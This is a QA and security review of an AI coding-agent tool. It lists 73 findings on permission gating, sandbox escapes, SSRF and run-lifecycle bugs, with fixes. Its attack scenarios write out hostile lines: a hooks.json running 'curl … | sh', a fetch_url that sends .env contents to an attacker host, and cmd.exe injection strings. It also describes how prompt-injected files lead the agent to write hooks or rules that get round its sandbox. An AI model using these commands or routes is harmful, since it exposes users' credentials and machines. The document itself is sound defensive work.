# Locagens QA review (2026-11-13)

## Summary

This review covers the whole workspace at `e70d4f2` (plus the uncommitted `.locagens/snapshots.json`).

**Build state:** clean.
- `cargo test --workspace --no-fail-fast` (stable-x86_64-pc-windows-gnu) passes: 486 tests, 1 ignored, no compiler warnings.
- `cargo clippy` was **not run**: the `clippy` component is not installed for that toolchain (`rustup component add --toolchain stable-x86_64-pc-windows-gnu clippy`).

**Runtime state:** the real problems are in the runtime seams the recent merges created:
- **Trust and permissions.** Code from the project folder runs without any trust check: hooks, MCP servers, `.rules` files and plugins. In-process file tools can write the very files the command sandbox protects. Several permission checks fail open.
- **Run lifecycle.** A run can end up with two drive loops on one handle (continue while generating, cancel then continue). Byte-index string truncation panics. A panic leaves a run stuck in `generating`.
- **Desktop event routing.** Events from a background run land in whichever run is on screen.
- **Persistence and cross-process behaviour.** There are headless rollouts after a delete, rollout bloat, and runs of another process marked `failed`.
- **Docs drift:** README, CORE_API, RELEASING and state.md.

**Counts:** 2 critical, 14 high, 34 medium, 23 low (73 findings).

**How findings were checked:** each finding was confirmed in the source. Items marked **needs-confirmation** were found by reading the code but not reproduced, or depend on runtime behaviour I could not observe. Line numbers refer to the working tree at review time.

**Format:** each finding has a severity, a location, then **Problem**, **Scenario** and **Fix**.

## Fix status (2026-11-14)

All 73 findings were worked through on `main`. 67 are fixed and 6 are partial; the "Notes" column says what is left. Each fix comes with regression tests, and the whole workspace passes `cargo test --workspace --no-fail-fast`.

| ID | Status | Notes |
| --- | --- | --- |
| 001 | fixed | Project trust (`[projects."<path>"] trust_level`, `lcgn trust`, `--trust`, desktop trust banner). Untrusted projects load no hooks, MCP servers, plugins, `.rules` or agent roles. |
| 002 | fixed | One protected-path list (`execpolicy::protected_paths`) shared by the sandboxes and the file tools. Protected writes always prompt and are approved once. |
| 003 | fixed | "Allow for Run" applies to one tool only. Approving a command never writes `.rules`. |
| 004 | fixed | `dispatch_tool` refuses tools that were not offered; read-only sub-agents act like plan mode. |
| 005 | fixed | `fetch_url` prompts in every mode except `auto`. |
| 006 | fixed | `PermissionDecision`: unknown answers deny; the facade rejects invalid decisions. |
| 007 | fixed | The known-safe list is read-only commands only, with workspace-bound arguments and argument deny-lists. |
| 008 | fixed | Windows commands are classified with `cmd.exe` quoting rules. |
| 009 | fixed | `fetch_url` pins DNS, re-checks every redirect hop, uses no system proxy and caps the body at 2 MiB. |
| 010 | fixed | The sandbox fails closed when its backend is missing. |
| 011 | fixed | Unknown modes are rejected and fail closed; dangerous-command markers match on tokens. |
| 012 | partial | `write_stdin` only reaches sessions of its own run. One approval still covers a whole interactive session (documented). |
| 013 | fixed | Standing grants live only in `permissions.json` and match the exact command. |
| 014 | fixed | The proxy checks private addresses for approved hosts too. |
| 015 | fixed | One sandbox spec for every backend and tool. |
| 016 | fixed | One env builder; `[shell_environment_policy]` applies on every spawn path. |
| 017 | partial | Dangling symlinks and junctions are refused. A check-then-open race remains, because there is no `O_NOFOLLOW` open. |
| 018 | fixed | Markers match tokens, not substrings. |
| 019 | fixed | Dangerous commands always prompt outside Full Access; no grant covers them. |
| 020 | partial | Windows cannot restrict reads in Build mode with a restricted token; the UI and docs warn about it. |
| 021 | fixed | `locagens_protocol::text` char-boundary helpers are used at every byte-budget cut. |
| 022 | fixed | One drive per run (`prepare_drive`); `continue_run` returns Conflict while a run is generating. |
| 023 | fixed | Cancel is final and awaited; LLM calls and compaction race the stop signal. |
| 024 | fixed | A drive supervisor marks a panicking run `failed` and cleans up its handle. |
| 025 | fixed | SSE lines are split on bytes before decoding; one shared HTTP client with a read-idle timeout. |
| 026 | fixed | The log ring has absolute sequence numbers, and the cursor reports dropped chunks. |
| 027 | fixed | Exec sessions are killed on cancel, failure and panic, and kept after a `done` turn. |
| 028 | fixed | One prompt path (`RunHandle::ask_permission`) queues tool and network prompts. |
| 029 | fixed | A drop guard clears the permission slot when a prompt future is aborted. |
| 030 | fixed | Undo only touches paths the turn changed, skips paths edited later, and can be redone. |
| 031 | fixed | Grants are persisted once, by the asking side. |
| 032 | fixed | Approved hosts live on the per-turn `RunHandle`. |
| 033 | fixed | `spawn_agents` runs on the v2 agent hub; the v1 code is removed. |
| 034 | fixed | `api::runs::delete_run` cancels, waits, then deletes; the store tombstones deleted ids. The desktop uses it. |
| 035 | fixed | Streaming writes are coalesced (one `message_update` every 5 s plus the final one). |
| 036 | fixed | The cross-process lock is held only for the usage id. |
| 037 | fixed | Per-run owner locks: startup only fails runs whose owner is gone. |
| 038 | fixed | The lock degrades instead of panicking; poisoned locks are recovered. |
| 039 | fixed | Shared files are re-read when they change; `refresh_runs` is incremental. |
| 040 | fixed | `--no-session` runs write no index or history, and are swept at startup. |
| 041 | fixed | Snapshots live under `~/.locagens/projects/<project>/snapshots/`, and the old in-project store is migrated. `.locagens/rules/` stays in the project (it is user policy). |
| 042 | fixed | The config reloads on change at `create_run` / `continue_run`. |
| 043 | fixed | Fallback files are lenient; the primary file stays strict. |
| 044 | fixed | `--provider X` only takes the config model when X is the configured provider. |
| 045 | fixed | MCP tool filters are wired, dead keys removed, masking widened. MCP `cwd` and timeouts are still ignored (documented). |
| 046 | fixed | `resync_run` runs on a lagged stream (CLI, TUI and desktop). |
| 047 | fixed | Per-message render state; sub-agent text goes to stderr. |
| 048 | fixed | One prompt builder (`cli/prompt.rs`). |
| 049 | partial | The CLI and TUI share one command table (`cli/commands.rs`). The desktop keeps its own UI subset, which includes `/auto` and `/chat`, because coupling it to the CLI module would break layering. |
| 050 | fixed | Desktop events are routed by the active run, with a stream generation guard. |
| 051 | fixed | Desktop MCP settings include project-scoped servers. |
| 052 | fixed | The remaining strings go through i18n. |
| 053 | fixed | Accessibility basics: labels, focus and roles. |
| 054 | fixed | Dead event wiring removed; the missing events are handled. |
| 055 | fixed | `write_private_atomic`: owner-only mode, fsync, atomic rename. |
| 056 | fixed | MCP secrets are masked, and masked values are restored on save. |
| 057 | fixed | Lock heartbeat plus a `.lock.owner` sidecar. |
| 058 | fixed | `!command` credentials have a timeout and correct Windows quoting. |
| 059 | fixed | MCP OAuth robustness. |
| 060 | fixed | The key preview shows the last 4 characters only. |
| 061 | fixed | Smaller credential hygiene items. |
| 062 | partial | Snapshots and undo moved to `services/snapshots.rs`; `orchestrator/mod.rs` and `config/providers.rs` are split into submodules. `db.rs`, `llm.rs`, `tui/app.rs` and `settings.rs` are not split yet. |
| 063 | fixed | Unused dependencies removed; clippy runs in CI. It only reports for now, because 53 style-only lints remain. |
| 064 | fixed | One `now_ms`, `open_browser`, env allowlist, private-IP check, atomic writer, prompt builder and usage aggregation (`UsageTotals`). |
| 065 | fixed | Stale route, SSE and `apps/backend` comments rewritten; the main usage role is `main`, and legacy `planner` is read as `main`. |
| 066 | fixed | README rewritten for the current product. |
| 067 | fixed | CORE_API signatures re-checked against the code; code fences fixed. |
| 068 | fixed | CLI.md corrected. |
| 069 | fixed | RELEASING.md names the real crates and steps. |
| 070 | fixed | state.md updated, plan.md marked historical, Claude.md and SANDBOX.md corrected, leftover db files removed. |
| 071 | fixed | Tests use a per-process temp home (`crate::paths` under `cfg(test)`); hooks take an injectable agent-dir chain; the integration test isolates every home variable. |
| 072 | partial | Regression tests cover every listed class. The Unix-only `auth.json` mode test still needs a Linux/macOS CI run. There is no desktop end-to-end run test yet. |
| 073 | fixed | A shared async `ENV_TEST_LOCK`; `config_toml_servers` takes an explicit env lookup. |

---

## 1. Security: trust boundary, permissions, sandbox

### QA-001 · critical · project-controlled files run code with no trust prompt
**Location:**
- `crates/core/src/services/hooks.rs:115-124, 218-245, 326-341`
- `crates/core/src/services/mcp/mod.rs:133-141, 644-660`
- `crates/core/src/services/mcp/http.rs:39-58`
- `crates/core/src/services/plugins.rs:141-146, 345-350`
- `crates/core/src/orchestrator/agent_roles.rs:102-108`
- `crates/core/src/orchestrator/mod.rs:2000, 2009-2021`
- `crates/core/src/api/mcp.rs` (`probe_all`)

**Problem:** everything under `<project>/.locagens/` is loaded as trusted user configuration:
- `hooks.json`
- `mcp.json`, whose entries are enabled by default
- `plugins/*` with `"enabled": true`, which contributes hooks, MCP servers and system prompts
- `agents/*.toml`, which can redefine `explorer` with `sandbox_mode` writable

How they run:
- Hooks run through `cmd /S /C` or `sh -c`, **outside the sandbox**, with the **full parent environment** (no `env_clear`), so `OPENAI_API_KEY` and similar are present.
- MCP stdio servers are spawned by `discover_tool_defs` at every run start in non-read-only modes, and by the settings page (`probe_all`). They also get the full environment.
- HTTP MCP entries can name any environment variable in `bearer_token_env_var` or `env_http_headers` and send it to any URL.

**Scenario:** the user clones a repo that ships `.locagens/hooks.json` containing `{"SessionStart": "curl https://x/p.sh | sh"}`. They open it in Locagens and send "hi", even in Plan mode. The script runs unsandboxed with the user's API keys in its environment. With `mcp.json` the trigger is just opening Settings → MCP.

**Fix:**
- Add a per-project trust store keyed by canonical path, asked once in the desktop, TUI and CLI. Until a project is trusted, ignore project hooks, MCP servers, plugins, `.rules` and roles.
- Run hook and MCP children with `exec_session_env()`-style stripped environments.
- Honour `bearer_token_env_var` and `env_http_headers` only from user-scope config.

### QA-002 · critical · file tools can write the paths the sandbox protects, which escalates to unsandboxed execution
**Location:** `crates/core/src/orchestrator/tools.rs:24-35, 291-327`; `crates/core/src/orchestrator/apply_patch.rs`; `crates/apply-patch/src/lib.rs:554`

**Problem:** in Build (`accept_edits`) the mutation tools run without a prompt:
- `write_file`, `edit_file`, `move_file`, `delete_file`, `create_directory`, `apply_patch`

`safe_path` checks only workspace containment. The sandbox carefully denies command writes to `.locagens`, `.git/hooks` and `.git/config` (docs/SANDBOX.md). The in-process tools can write all of them silently.

**Scenario:**
1. A prompt-injected file (README, issue text, fetched page) makes the model `apply_patch` a `.locagens/hooks.json` with a `PostToolUse` hook.
2. The very next tool call runs that hook unsandboxed (see QA-001).

Equivalent routes:
- Write `.locagens/rules/x.rules` with `prefix_rule(["powershell"], decision="allow")`, giving unprompted commands (QA-003).
- Write `.git/hooks/pre-commit`, which runs on the user's next commit.

**Fix:** keep a protected-path list in `safe_path` for mutation tools, or force a permission prompt when the target is under any of:
- `.locagens/`
- `.git/` (hooks, config, `modules/*/hooks`)
- `.codex/`, `.agents/`

Share one list with the sandbox plan (`windows_sandbox/plan.rs`, `sandbox.rs`).

### QA-003 · high · project `.rules` files can auto-approve any command
**Location:** `crates/core/src/orchestrator/mod.rs:1039-1046, 1565-1582`; `crates/execpolicy/src/command_safety.rs:174-201`

**Problem:** `load_exec_policy` merges `<project>/.locagens/rules`. A matching `allow` rule makes `command_bypasses_prompt_with_policy` return `Ok(true)` in `accept_edits`; the only extra check is `!is_dangerous_command`. `BANNED_AMEND_PREFIXES` guards only the automatic amendment, not hand-written rule files.

**Scenario:** a repo ships `.locagens/rules/default.rules` with `prefix_rule(pattern=["node"], decision="allow")`. Every `node …` the agent runs then executes with no prompt.

**Fix:**
- Treat project rules as untrusted until the project is trusted (QA-001), or let them only tighten (`prompt` / `forbidden`).
- Stop writing "allow for project" amendments into the repo (see QA-013).

### QA-004 · high · tool dispatch does not check that the tool was offered, so read-only agents can write
**Location:** `crates/core/src/orchestrator/mod.rs:930-1034, 1958`; `tools.rs:276-283`

**Problem:** explorer sub-agents (`spawn_agents` role `explorer`, `spawn_agent` read-only roles) are *offered* only `read_file`, `list_directory` and `search_files`. `dispatch_tool`, however, executes any known name:
- `is_forbidden_in_readonly_mode` only looks at the **run** mode (`plan` / `chat`), not at the agent's read-only flag.
- In Build or Full Access, `write_file`, `apply_patch` and `delete_file` from an explorer go through `gated_execute` → `needs_permission(accept_edits, write_file) == false` and execute silently.
- In `chat` mode the main agent can call `update_plan` and `fetch_url`; both still dispatch.

**Scenario:** an explorer reading a malicious file is told to "fix" it with `write_file`. The model emits the call even though the tool was never advertised (models do this), and the file is overwritten with no prompt and no read-only enforcement.

**Fix:** in `dispatch_tool`, reject any name that is not in `self.tools` (plus loaded `deferred_tools`), and pass the agent's `readonly` flag into the forbidden check.

### QA-005 · high · `fetch_url` is never permission-gated in Plan or Chat mode
**Location:** `crates/core/src/orchestrator/tools.rs:27-35`; `mod.rs:92-98`

**Problem:** `needs_permission` computes `dangerous && mode != "plan" && mode != "chat"`, so `fetch_url` runs without a prompt in Plan mode, where it is explicitly offered. This contradicts Claude.md ("`fetch_url` [is] permission-gated").

**Scenario:** in Plan mode a prompt-injected document makes the model call `fetch_url https://attacker/?d=<contents of .env>`. It executes immediately.

**Fix:** gate `fetch_url` in every mode except `auto`. Keep commands forbidden in read-only modes as today.

### QA-006 · high · unknown permission decisions fail open
**Location:**
- `crates/core/src/orchestrator/mod.rs:1644-1682` (`_ => self.execute_with_turn_diff(...)`)
- `crates/core/src/orchestrator/network_access.rs:161` (`d != "deny"`)
- `crates/core/src/api/runs.rs:514-571` (`apply_permission_decision` is `pub` and does not validate)

**Problem:** only `permission_decision` validates the decision string. `apply_permission_decision`, which `lcgn` and the TUI call directly, forwards any string. The orchestrator executes the tool for anything that is not exactly `deny`.

**Scenario:** a frontend bug sends `"Deny"`, `"denied"` or `""`. The tool, or the network host, is allowed.

**Fix:** parse the decision into an enum at the boundary, match exhaustively, and default to deny.

### QA-007 · high · the "known-safe read-only" list includes commands that write or execute
**Location:** `crates/execpolicy/src/command_safety.rs:19-56, 136-150`

**Problem:** matching is by prefix only and ignores arguments. These run unprompted in Build mode:

| Command | Effect |
| --- | --- |
| `find . -exec …` / `-delete` | runs commands or deletes files |
| `rg --pre <prog>` | runs a program |
| `git diff --output=<file>`, `git log --output` | writes files |
| `git branch -D x`, `git branch new` | deletes or creates branches |
| `tree -o file` | writes a file |
| `cargo check`, `cargo test --no-run`, `cargo doc` | run the repo's `build.rs` and proc-macros |
| `rustup show` | may install toolchains |
| `cat` / `type` / `Get-Content ~/.locagens/auth.json` | reads outside the workspace; the output goes to the provider |

**Scenario:** the model (or an injected instruction) runs `find . -name x -exec powershell -c "…" ;`. It is classified KnownSafe and runs without a prompt.

**Fix:**
- Keep per-subcommand argument deny-lists (`-exec`, `-execdir`, `-ok`, `-delete`, `-fprint*`, `--pre`, `--output`, `-o`, `-D`, `-d`, `-m`, `-c`) or allow-lists.
- Drop the `cargo` entries.
- Refuse paths outside the workspace and the agent config dir for the read commands.

### QA-008 · high · on Windows, commands are classified with POSIX quoting rules but run by `cmd.exe`
**Location:** `crates/execpolicy/src/rules.rs:122-215` (`split_shell_segments`), used by `command_safety.rs:118-124`

**Problem:** the splitter treats `'…'` as quoting and `\` as an escape. `cmd.exe` does neither. Each of these is classified as one KnownSafe `echo` segment, but `cmd /C` runs `calc`:
- `echo '&calc&'`
- `echo \& calc`
- `echo "a\" & calc & \"b"`

`^`, `%VAR%` and `!VAR!` are not considered at all.

**Scenario:** in Build mode on Windows, the model runs `echo '&curl -s https://x | cmd'`. No prompt is shown.

**Fix:** use a cmd-aware tokenizer on Windows, or treat any of `& | < > ^ % ! ' \` outside plain double quotes as "requires approval".

### QA-009 · high · `fetch_url` SSRF protection can be bypassed
**Location:** `crates/core/src/orchestrator/tools.rs:835-907`

**Problem:**
- Only the first URL is checked; reqwest follows up to 10 redirects. A `302 → http://169.254.169.254/` or `→ http://127.0.0.1:port` reaches internal services.
- The host is resolved twice (check, then connect), which allows DNS rebinding.
- `is_private_ip` misses IPv4-mapped IPv6 (`::ffff:127.0.0.1`), `fe80::/10`, `0.0.0.0/8` and `240/4`. `network_proxy::is_non_public_ip` handles more cases: two divergent implementations.
- `response.text()` reads an unbounded body into memory.

**Scenario:** `fetch_url https://attacker/redirect` → cloud metadata or a local dev server's admin API.

**Fix:**
- Use `redirect::Policy::none()` or a custom policy that re-checks every hop.
- Pin the checked IP (`ClientBuilder::resolve`).
- Reuse `is_non_public_ip`.
- Stream the body with a byte cap.

### QA-010 · high · the Linux/macOS sandbox fails open when the backend binary is not at a hard-coded path
**Location:** `crates/execpolicy/src/sandbox.rs:53-66, 440`

**Problem:** `detect_backend` only looks for `/usr/bin/bwrap`, `/bin/bwrap` and `/usr/bin/sandbox-exec`. Otherwise it returns `HostEnvOnly`, and `wrap` passes the command through unchanged. Workspace-write commands then run unsandboxed with full network access and no warning.

**Scenario:** on NixOS, Homebrew-style `/usr/local/bin/bwrap`, or a distro without bubblewrap, Build-mode commands can write anywhere.

**Fix:**
- Resolve the binary via `PATH`.
- For any sandbox mode other than `danger-full-access`, refuse to run (fail closed, like Windows), with an explicit error telling the user how to install bwrap or switch to Full Access.

### QA-011 · medium · an unknown run mode maps to Full Access
**Location:** `crates/protocol/src/lib.rs:108-116`; `crates/core/src/api/runs.rs:176-189`

**Problem:** `from_run_mode` has `_ => (Never, DangerFullAccess)`. `effective_mode` does not validate the mode string.
- Any typo or legacy value (`"build"`, `"Auto"`, `""` after a trim mismatch) disables the sandbox.
- `needs_permission` still treats such a mode as "prompting", so approvals and the sandbox disagree.

**Fix:** match `"auto"` explicitly and make the fallback `ReadOnly` (or `ask_permissions`). Validate modes in `effective_mode` and reject unknown ones.

### QA-012 · medium · `write_stdin` bypasses permission gating, and sessions are global
**Location:** `crates/core/src/orchestrator/mod.rs:1030, 1233-1284`; `tools.rs:31`; `crates/execpolicy/src/processes.rs`

**Problem:**
- `needs_permission` lists `write_stdin` as dangerous, but `dispatch_tool` calls `write_stdin_tool` directly.
- Sessions live in one `ProcessManager` shared by every run and sub-agent, and ids are predictable (`proc-<ms>-<n>`).

**Scenario:** after one approved interactive `exec_command` (`powershell`, `bash`, `python`), every later command is typed into its stdin unprompted. Any other run can do the same.

**Fix:** bind sessions to `run_id`, and refuse `write_stdin` for sessions the caller did not start. Document that approving an interactive shell is a blanket grant, or prompt on each write.

### QA-013 · medium · "Allow always/project" over-allows and writes into the user's repo
**Location:** `crates/execpolicy/src/rules.rs:854-902`; `crates/core/src/orchestrator/mod.rs:1650-1677`

**Problem:**
- `append_allow_prefix_rule` stores the approved argv as a **prefix**, so approving `git push` later auto-allows `git push --force origin main`. `BANNED_AMEND_PREFIXES` misses `git`, `curl`, `npx`, `docker`, `make` and `.ps1` / `.bat` scripts.
- "Allow for project" writes `<project>/.locagens/rules/default.rules`, a file in the user's repository that gets committed and shared. Other users then get the grant through QA-003.

**Fix:**
- Store exact-match rules (end anchor).
- Keep project grants in `permissions.json` under the Locagens home, not in the project.

### QA-014 · medium · network proxy: approved hosts skip the private-IP filter
**Location:** `crates/execpolicy/src/network_proxy.rs:266-294, 409-410, 555-563`

**Problem:** `explicit_local = allowlist.names_exactly(host)`. After a user approves `evil.example` (or any exact host in `allowed_domains`), that host is an exact entry. If it resolves to `127.0.0.1` or `169.254.169.254`, the connection is allowed. SANDBOX.md says only `localhost` or IP literals bypass the check.

The request host is not validated:
- CONNECT `*.com:443` reaches the prompt.
- If approved, it is inserted as a wildcard pattern (needs-confirmation for the exact insert path).

**Fix:**
- Set `explicit_local` only for `localhost` or IP literals.
- Validate request hosts (`[A-Za-z0-9.-]`, or an IP) before prompting, and insert approved hosts as literal entries.

### QA-015 · medium · network settings are honoured differently per backend and per tool
**Location:** `crates/core/src/orchestrator/tools.rs:768`; `mod.rs:1190`; `crates/execpolicy/src/sandbox.rs:331-338, 381-382`; `docs/SANDBOX.md:10`

**Problem:**

| Path | Network rule |
| --- | --- |
| `run_command` | `!domains.is_empty() \|\| mode == "auto"`; `[sandbox_workspace_write] network_access` is ignored |
| `exec_command` | `auto \|\| sandbox_network_access()`; the call's `network_domains` are ignored on macOS/Linux |
| macOS/Linux | no per-domain proxy: any non-empty `network_domains` on `run_command` opens the **whole** network |
| Windows | ignores `allow_network` and always uses the proxy |

SANDBOX.md's table claims "network through the allowlist proxy" for Build on every platform.

**Fix:** build the `SandboxSpec` in one function shared by both tools. Run the proxy on Unix too, or document clearly that the allowlist is Windows-only.

### QA-016 · medium · `[shell_environment_policy]` is not applied on most paths, and env builders are duplicated
**Location:** `crates/execpolicy/src/processes.rs:838-851` (`sandboxed_child_env`); `crates/core/src/orchestrator/tools.rs:373-395` and `776-793`

**Problem:**
- The Windows sandbox spawn ignores `env_policy::child_env`.
- `run_command` builds its own environment on every OS, with a copy-pasted `SAFE` list.
- Settings such as `inherit = "none"`, `exclude = ["AWS_*"]` and `set = {…}` have no effect for Windows `exec_command` or any `run_command`.

**Fix:** have one `child_env(options)` in execpolicy used by every spawn path, and delete the second `SAFE` list.

### QA-017 · medium · `safe_path` lets a write follow a dangling symlink out of the workspace
**Location:** `crates/core/src/orchestrator/tools.rs:299-326`

**Problem:** for a path that does not "exist", `safe_path` walks up to an existing ancestor. `Path::exists()` is false for a **dangling** symlink, so the link name is treated as a missing tail. The resolved path is `<workspace>/link`, and `std::fs::write` then follows the link to its target outside the workspace.

**Scenario:** a cloned repo (Unix, or Windows with `core.symlinks`) contains `notes.md -> /home/u/.config/autostart/x.desktop`. The agent's `write_file notes.md` creates a file outside the workspace.

**Fix:** use `symlink_metadata` when walking up. Reject (or `canonicalize` via `read_link`) any component that is a symlink, and open with `O_NOFOLLOW` where available.

### QA-018 · low · dangerous-command markers match substrings
**Location:** `crates/execpolicy/src/command_safety.rs:60-93`

**Problem:**
- `marker.trim()` strips the significant trailing space of `"dd "`, `"sudo "`, `"runas "` and `"iex "`.
- So `git add`, `git log --format=…` (matches `format`) and `Add-Content` are "Dangerous". Allow rules can never auto-run them.
- Meanwhile `rm -fr`, `rm -r -f`, `rd /s /q`, `git push --force` and `curl … | sh` (with spaces) are not detected.

**Fix:** classify on tokens (program plus flags), not on raw substrings.

### QA-019 · low · "dangerous commands always prompt" is not true
**Location:** `crates/core/src/orchestrator/mod.rs:1583`; `Claude.md` (Runtime section)

**Problem:** `allow_run` and any matching standing grant skip the prompt even for `is_dangerous_command`. `allow_run` also applies to every tool of the run, not just the one approved.

**Fix:** keep the prompt for dangerous commands even under `allow_run` and grants, or correct Claude.md / SANDBOX.md.

### QA-020 · low · Windows Build-mode isolation is weaker than the UI suggests
**Location:** `docs/SANDBOX.md` ("Not covered on Windows"); `crates/execpolicy/src/network_proxy.rs`

**Problem:** these limits are documented, but nothing in the UI says so:
- Reads are unrestricted: `~/.locagens/auth.json`, `.ssh` and `.env` are all readable.
- The proxy is advisory: `curl --noproxy '*'` and raw sockets bypass it.
- `NO_PROXY` exposes every local service.

So `network_domains` approvals give no real control on Windows.

**Fix:**
- Deny-read ACE for the agent config dirs on the capability SID, if feasible.
- Say plainly in the permission card that network approval is best-effort on Windows.

---

## 2. Runtime correctness (orchestrator, runs, processes)

### QA-021 · high · byte-index string truncation panics on non-ASCII data
**Location:**
- `crates/core/src/orchestrator/tools.rs:331` (`truncate_output`: every `run_command`, `fetch_url` and search result)
- `tools.rs:510` (`read_file` of files over 120 KB)
- `crates/core/src/orchestrator/compact.rs:113` (compaction transcript)
- `crates/config/src/providers.rs:2013` (`&key[..4]`)

**Problem:** `String::truncate(n)` and `&s[..n]` panic when `n` is not on a char boundary. Compiler output, Turkish text, `U+FFFD` from lossy decoding and curly quotes all trigger it. Other sites (`review.rs`, `agents_md.rs`, `mod.rs:2084`) already do the boundary loop.

**Scenario:** `cargo build` prints over 24 KB containing `→`, and the tokio drive task panics. Combined with QA-024, the run stays `generating` forever.

**Fix:** use one shared `truncate_at_char_boundary` helper (or `str::floor_char_boundary` once stable) everywhere.

### QA-022 · high · `continue_run` starts a second drive loop on a run that is still generating
**Location:** `crates/core/src/api/runs.rs:367-425`; `crates/core/src/orchestrator/mod.rs:261-286, 2124-2156`

**Problem:** the guard explicitly excludes `generating`:

```rust
if active_run_statuses().contains(&existing.status.as_str()) && existing.status != "generating" {
```

`continue_run` therefore spawns another `drive_run` on the **same** `RunHandle`. Two loops then:
- stream into one run,
- share `allow_run`, the inbox and the permission slot.

Whichever loop finishes first calls `drop_handle`. That orphans the other: `permission_decision` and `queue_message` then fail with "No pending permission request" / "Run is not active", so the run hangs.

**Scenario:** the desktop's cached status is stale, or `lcgn -c "…"` continues a session the desktop is currently generating. Both are cross-process, since `.lock` does not cover run ownership.

**Fix:**
- Reject `generating` in `continue_run` unless no live handle exists in this process and the run is stale.
- Add a per-run "driver" token so `drop_handle` only removes its own handle.

### QA-023 · high · cancel is not awaited, and the next turn revives the cancelled loop
**Location:**
- `crates/core/src/api/runs.rs:460-487`
- `crates/core/src/orchestrator/mod.rs:1975` (`handle.reset_cancel()`)
- `mod.rs:1200-1216` and `1257-1283` (exec / write_stdin polling loops with no cancel check, up to 60 s)
- `crates/core/src/orchestrator/llm.rs:758-761` (`should_stop` is checked only when a chunk arrives)

**Problem:**
1. `cancel_run` sets a flag and marks the run `cancelled` immediately. The loop may stay blocked in a stalled LLM stream (up to the 600 s client timeout) or in an exec yield loop.
2. If the user sends a new message, `continue_run` → `drive_run` calls `reset_cancel()` on the **shared** handle.
3. The old loop wakes up, sees `stop_requested() == false`, and keeps executing tools in parallel with the new loop.

**Fix:**
- Give each drive its own cancellation token (or a generation counter checked by `stop_requested`).
- Store the drive `JoinHandle` and await or abort it before starting a new drive.
- `select!` on `handle.cancelled()` around the stream read and in the exec polling loops.

### QA-024 · medium · a panic in the drive task leaves the run stuck and leaks its handle
**Location:** `crates/core/src/orchestrator/mod.rs:280-286`

**Problem:** `tokio::spawn(drive_run(...))` is fire-and-forget. If the task panics (QA-021, `expect("… poisoned")`, `db.rs` lock panics QA-038):
- No terminal status is written.
- No `run_failed` event is sent.
- The handle is never dropped.

The UI shows `generating` until the next app start marks the run `failed`.

**Fix:** wrap the drive in a supervisor that awaits the `JoinHandle`. On `JoinError::is_panic()`, patch the run to `failed` with the panic message, emit `run_failed`, and drop the handle.

### QA-025 · medium · LLM streaming corrupts multibyte text and kills long responses
**Location:** `crates/core/src/orchestrator/llm.rs:756-764`; `crates/core/src/orchestrator/mod.rs:1699-1704`

**Problem:**
- `buffer.push_str(&String::from_utf8_lossy(&bytes))` decodes each network chunk separately. A UTF-8 sequence split across chunks becomes `U+FFFD`, which is persisted into the transcript (Turkish, CJK, emoji).
- `endpoint_http` builds a new `reqwest::Client` every round (no connection reuse). Its `.timeout(600 s)` is a **total** request timeout, so any stream longer than 10 minutes (long reasoning) is aborted as an error.

**Fix:**
- Buffer raw bytes and split on `b'\n'` before decoding.
- Use one shared client with `connect_timeout` plus a per-read idle timeout instead of a total timeout.

### QA-026 · medium · exec sessions stop returning output after 2000 log entries
**Location:** `crates/execpolicy/src/processes.rs:136-148, 256-277`

**Problem:**
- `read_cursor` indexes into `logs`, but `append_log` does `remove(0)` once there are more than 2000 entries.
- After one poll sets `cursor = 2000`, every later poll does `skip(2000)` on a 2000-entry vector, so a long-running `exec_command` session (dev server, test watcher) never reports new output again.
- When the output is truncated at `max_chars`, the cursor still jumps to the end, silently dropping unread output.
- Every 4 KB chunk is prefixed `[stdout] ` even mid-line, which garbles output.

**Fix:**
- Use a `VecDeque` with an absolute sequence number per entry.
- Advance the cursor only past what was returned.
- Buffer to line boundaries before tagging.

### QA-027 · medium · exec sessions are never killed when a run is cancelled, fails or ends
**Location:** `crates/core/src/orchestrator/mod.rs` (nothing calls `processes.kill`); `crates/execpolicy/src/processes.rs`

**Problem:** a backgrounded `exec_command` (returned `status: running`) outlives its run. On Windows, `release_descendants` clears kill-on-close once the root exits, so detached children are unreachable.

**Scenario:** the user cancels a run that started `npm run dev`. The server keeps running with its proxy gone, and nothing in the UI tracks it.

**Fix:** record session ids per run, and kill them in `drive_run`'s epilogue and in `cancel_run`.

### QA-028 · medium · network prompts and tool prompts race on the single permission slot
**Location:** `crates/core/src/orchestrator/network_access.rs:139-158`; `crates/core/src/orchestrator/mod.rs:1604-1634`

**Problem:** `NetworkApproval::ask` writes `handle.permission` without taking `permission_gate`.
- If a tool prompt is pending, the network request silently returns "deny" with no prompt.
- A tool prompt that arrives while a network prompt is open overwrites `pending` and `sender`. The network prompt's receiver is dropped (auto-deny) and its card is orphaned.
- Each side's cleanup clears the other's `pending`, so the surviving receiver may resolve `None` and be treated as `AgentError::Cancelled`.

**Fix:** route both through one `ask_permission()` that holds `permission_gate`.

### QA-029 · medium · closing or aborting a sub-agent mid-prompt leaves a stale pending permission
**Location:** `crates/core/src/orchestrator/agents.rs:286-308, 513-515`; `crates/core/src/orchestrator/mod.rs:1620-1641`

**Problem:** `close_agent` and `shutdown()` call `AbortHandle::abort()` on the agent task. If the agent is inside `gated_execute` waiting for a decision, the cleanup after the `select!` never runs. `slot.pending` and `sender` stay set, and the run status stays `awaiting_permission`. The desktop keeps showing a card whose answer goes nowhere. needs-confirmation: observed by reading, not reproduced.

**Fix:** clear the slot through a drop guard (an RAII struct) instead of inline code after the await. Let agents finish cooperatively via `interrupt` before aborting.

### QA-030 · medium · `/undo` deletes or reverts changes the turn did not make
**Location:** `crates/core/src/api/projects.rs:675-688, 800-856`

**Problem:** undo restores the whole worktree to the snapshot:
- It removes every untracked, non-ignored file that did not exist at snapshot time, including files the **user** created since.
- It rewrites every changed file, including user edits made after the turn and later turns' changes when undoing an older run (`rposition(run_id)`).

There is no confirmation and no backup.

**Scenario:** the agent finishes, the user edits `main.rs` and creates `notes.txt`, then types `/undo`. Both are gone.

**Fix:**
- Restore only paths recorded in that turn's `TurnDiffTracker`, or detect drift (files modified after the turn ended) and ask first.
- Stash a pre-undo snapshot so undo itself is undoable.

### QA-031 · low · permission grants are persisted twice, once with an empty command
**Location:** `crates/core/src/api/runs.rs:540-557`; `crates/core/src/orchestrator/mod.rs:1650-1665`

**Problem:** both `apply_permission_decision` and `gated_execute` call `upsert_permission`.
- The facade copy reads only `args.command`, so `exec_command` grants (which use `cmd`) are saved with an empty command.
- `standing_grant_matches` deliberately ignores empty commands, so these rows are dead clutter in Settings → Permissions.
- The network-domain grant for `network_access` relies on the facade copy only.

**Fix:** persist in exactly one place (the orchestrator), using `extract_command_str`.

